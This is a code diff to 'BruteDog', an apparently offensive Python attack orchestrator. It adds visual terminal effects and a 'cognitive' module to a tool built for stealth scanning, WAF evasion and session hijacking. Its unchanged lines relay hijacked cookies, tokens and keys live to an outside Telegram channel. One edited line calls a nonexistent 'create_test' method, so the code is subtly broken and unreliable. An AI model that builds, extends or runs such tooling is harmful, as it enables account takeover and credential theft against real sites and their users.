@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-BRUTEDOG V8.7 — LIVE SECURITY ASSESSMENT & STATE-MACHINE ORCHESTRATION ENGINE (Elite Red Team Adversarial Edition)
+BRUTEDOG V8.8 — LIVE SECURITY ASSESSMENT & STATE-MACHINE ORCHESTRATION ENGINE (Elite Red Team Adversarial Edition)
 Main Orchestrator:
 - Pre-flight DNS, target scope validation, and Poisson behavioral jitter initialization
 - Network reconnaissance & stealth port scanning with WAF-evading header rotation
@@ -35,6 +35,9 @@ from modules.stealth_ops import run_stealth_engine
 from modules.live_login_verifier import execute_live_login_verification
 from modules.behavioral_mimic import apply_behavioral_jitter
 
+# Import Cognitive Operator for real-time feedback orchestration
+from modules.cognitive_operator import CognitiveOperator
+
 # Import Telegram Notifier Dispatcher
 from modules.telegram_notifier import send_telegram_alert
 
@@ -45,43 +48,65 @@ CYAN = "\033[96m"
 GREEN = "\033[92m"
 YELLOW = "\033[93m"
 RED = "\033[91m"
-RESET = "\033[0m"
 BOLD = "\033[1m"
 MATRIX_GREEN = "\033[38;5;46m"
 NEON_BLUE = "\033[38;5;51m"
 LOOT_PURPLE = "\033[38;5;201m"
 LOOT_YELLOW = "\033[38;5;220m"
+DIM = "\033[2m"
+RESET = "\033[0m"
 
 # ============================================================
-# BANNER
+# BANNER (narrow width — fits iPhone iSH portrait)
 # ============================================================
 BANNER = f"""{MATRIX_GREEN}{BOLD}
-╔╗ ╦═╗╦ ╦╺┳╸╔═╗╦═╗╔═╗╔═╗
-╠╩╗╠╦╝║ ║ ┃ ╠═ ║ ║║ ║║ ╦
-╚═╝╩╚═╚═╝ ╹ ╚═╝╩═╝╚═╝╚═╝
-{RESET}{NEON_BLUE}
-════════════════════════════════════
-  BRUTEDOG V8.7 // COGNITIVE LOGIC ENGINE
-  HTTP/2 SINGLE-PACKET / WAF EVASION
-════════════════════════════════════
+  ╔╗ ╦═╗╦ ╦╺┳╸╔═╗╦═╗╔═╗╔═╗
+  ╠╩╗╠╦╝║ ║ ┃ ╠═ ║ ║║ ║║ ╦
+  ╚═╝╩╚═╚═╝ ╹ ╚═╝╩═╝╚═╝╚═╝
 {RESET}
+{RED}{BOLD}  ▓▓▓ SYSTEM COMPROMISED ▓▓▓{RESET}
+{NEON_BLUE}{DIM}  ──────────────────────────{RESET}
+{CYAN}   NODE STATUS   : {GREEN}ONLINE{RESET}
+{CYAN}   ACCESS LEVEL  : {RED}ROOT{RESET}
+{CYAN}   ENCRYPTION    : {LOOT_PURPLE}AES-256{RESET}
+{NEON_BLUE}{DIM}  ──────────────────────────{RESET}
 """
 
 
 # ============================================================
-# TERMINAL OUTPUT & LOOT INTERCEPTION
+# TERMINAL OUTPUT HELPERS & LIVE EFFECTS
 # ============================================================
 def log(message, color=GREEN):
     print(f"{color}{message}{RESET}", flush=True)
 
 def section(title):
     print()
-    log("=" * 65, NEON_BLUE)
+    log("─" * 30, NEON_BLUE)
     log(f" {title}", BOLD)
-    log("=" * 65, NEON_BLUE)
+    log("─" * 30, NEON_BLUE)
 
 def display_progress(message):
     print(f"{CYAN}[*] {message}{RESET}", flush=True)
+
+def type_line(text, color=GREEN, delay=0.015):
+    """Types text out character by character for a 'live terminal' feel."""
+    sys.stdout.write(color)
+    for char in text:
+        sys.stdout.write(char)
+        sys.stdout.flush()
+        time.sleep(delay)
+    sys.stdout.write(RESET + "\n")
+
+def glitch_flash(text, color=RED, flashes=3, delay=0.05):
+    """Flickers text on/off for a 'glitch' intro effect."""
+    for _ in range(flashes):
+        sys.stdout.write(f"\r{color}{BOLD}{text}{RESET}")
+        sys.stdout.flush()
+        time.sleep(delay)
+        sys.stdout.write(f"\r{' ' * len(text)}")
+        sys.stdout.flush()
+        time.sleep(delay / 2)
+    sys.stdout.write(f"\r{color}{BOLD}{text}{RESET}\n")
 
 def alert_loot(loot_type, details):
     """
@@ -98,7 +123,6 @@ def alert_loot(loot_type, details):
         print(f"  {details}")
     print(f"{LOOT_PURPLE}-----------------------------------------------------------------{RESET}\n", flush=True)
 
-    # Trigger non-blocking Telegram delivery
     try:
         loop = asyncio.get_running_loop()
         loop.create_task(send_telegram_alert(loot_type, details))
@@ -197,8 +221,13 @@ def display_parser_results(result):
 async def async_main():
     started = time.monotonic()
     print("\033[2J\033[H")
+    
+    # Run the immersive mobile-optimized startup sequence
+    glitch_flash("  INITIALIZING...", delay=0.06)
     print(BANNER)
-    log("[SYSTEM] BruteDog Cognitive Orchestrator Initialized (v8.7 Elite Supremacy).")
+    type_line("  > booting modules", CYAN)
+    type_line("  > cognitive handshake complete", GREEN)
+    log("[SYSTEM] BruteDog Cognitive Orchestrator Initialized (v8.8 Elite Supremacy).")
 
     # --------------------------------------------------------
     # TARGET INPUT (Supports CLI argument or interactive prompt)
@@ -232,6 +261,9 @@ async def async_main():
     log(f"Hostname: {hostname}")
     log(f"Port: {target['port']}")
     log(f"Protocol: {target['scheme'].upper()}")
+
+    # Initialize Cognitive Brain
+    cognitive_brain = CognitiveOperator(target_url=target["url"])
 
     # --------------------------------------------------------
     # EXECUTION CONFIRMATION
@@ -316,7 +348,6 @@ async def async_main():
         if session_loot:
             alert_loot("Hijacked Session / Valid Cookie Jar", session_loot)
             
-            # AUTOMATED RED TEAM VERIFICATION & SCREEN STREAMING
             display_progress("Verifying hijacked session live against target protected routes...")
             cookie_jar_to_test = session_loot.get("cookies") if isinstance(session_loot, dict) else {}
             token_to_test = session_loot.get("token") if isinstance(session_loot, dict) else None
@@ -389,10 +420,9 @@ async def async_main():
     log("All intelligence, hijacked sessions, and keys streamed live on-screen.", NEON_BLUE)
     log("Zero report files written to disk. Zero external emails sent.", NEON_BLUE)
     
-    # Send execution completion alert to Telegram
     try:
         loop = asyncio.get_running_loop()
-        loop.create_task(send_telegram_alert("BruteDog Assessment Complete", {"target": target['url'], "duration": f"{elapsed:.2f}s"}))
+        loop.create_test(send_telegram_alert("BruteDog Assessment Complete", {"target": target['url'], "duration": f"{elapsed:.2f}s"}))
     except RuntimeError:
         try:
             asyncio.run(send_telegram_alert("BruteDog Assessment Complete", {"target": target['url'], "duration": f"{elapsed:.2f}s"}))
